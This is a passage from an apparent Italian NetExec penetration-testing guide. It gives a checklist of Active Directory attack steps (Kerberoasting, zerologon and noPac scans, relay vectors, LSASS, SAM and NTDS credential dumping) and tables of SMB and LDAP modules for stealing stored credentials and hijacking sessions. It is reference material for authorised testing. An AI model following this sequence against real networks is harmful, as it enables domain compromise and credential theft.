[ ] AS-REP Roasting e Kerberoasting
[ ] GMSA, LAPS
[ ] MAQ → valuta RBCD
[ ] BloodHound collection via LDAP
[ ] Vulnerability scan — zerologon, nopac, coerce_plus
[ ] WebDAV/Spooler — valuta vettori relay
[ ] enum_av — identifica difese prima di eseguire moduli rumorosi
[ ] (Pwn3d!) → SAM, LSA, DPAPI, lsassy
[ ] Admin su DC → NTDS dump
[ ] Moduli app — veeam, winscp, putty, msol, iis
[ ] Documenta tutto con --output
```

***

## Tabella Moduli SMB

| Modulo               | Scopo                             |
| -------------------- | --------------------------------- |
| `spider_plus`        | Crawling ricorsivo tutte le share |
| `lsassy`             | Dump LSASS (stealthy)             |
| `mimikatz`           | Mimikatz remoto                   |
| `laps`               | Password LAPS                     |
| `gpp_password`       | GPP credentials in SYSVOL         |
| `gpp_autologin`      | Autologon credentials in GPO      |
| `enum_av`            | AV/EDR installati                 |
| `enum_ca`            | Certificate Authority ADCS        |
| `webdav`             | WebClient service (relay HTTP)    |
| `spooler`            | Print Spooler                     |
| `coerce_plus`        | Tutti i vettori di coercion       |
| `zerologon`          | CVE-2020-1472                     |
| `nopac`              | CVE-2021-42278/42287              |
| `ms17-010`           | EternalBlue                       |
| `timeroast`          | Hash via NTP senza credenziali    |
| `slinky`             | LNK su share scrivibili           |
| `drop-library-ms`    | CVE-2025-24054                    |
| `backup_operator`    | NTDS via Backup Operator          |
| `veeam`              | Credenziali Veeam                 |
| `msol`               | Azure AD Connect Sync             |
| `shadowrdp`          | Hijack sessioni RDP               |
| `impersonate`        | Token impersonation               |
| `winscp`             | WinSCP saved sessions             |
| `putty`              | PuTTY SSH keys                    |
| `iis`                | IIS credentials                   |
| `wifi`               | WiFi passwords                    |
| `powershell_history` | PS history                        |
| `eventlog_creds`     | Credenziali nei log eventi        |
| `notepad++`          | File non salvati Notepad++        |
| `mssql_priv`         | MSSQL privilege escalation        |

## Tabella Moduli LDAP

| Modulo           | Scopo                         |
| ---------------- | ----------------------------- |
| `adcs`           | Trova CA e template           |
| `daclread`       | Permessi ACL su oggetti AD    |
| `laps`           | Password LAPS via LDAP        |
| `gmsa`           | GMSA password                 |
| `maq`            | MachineAccountQuota           |
| `pre2k`          | Account pre-Windows 2000      |
| `get-desc-users` | Descrizioni utenti            |
| `get-network`    | DNS records                   |
| `enum_trusts`    | Trust tra domini              |
| `ldap-checker`   | LDAP signing/binding          |
| `obsolete`       | OS obsoleti                   |
| `entra-id`       | Trova server Azure AD Connect |

***

*Guida aggiornata a NetExec v1.4.0+ (2026). Per approfondire Active Directory: [Guida AD su HackIta](https://hackita.it/articoli/active-directory/)*
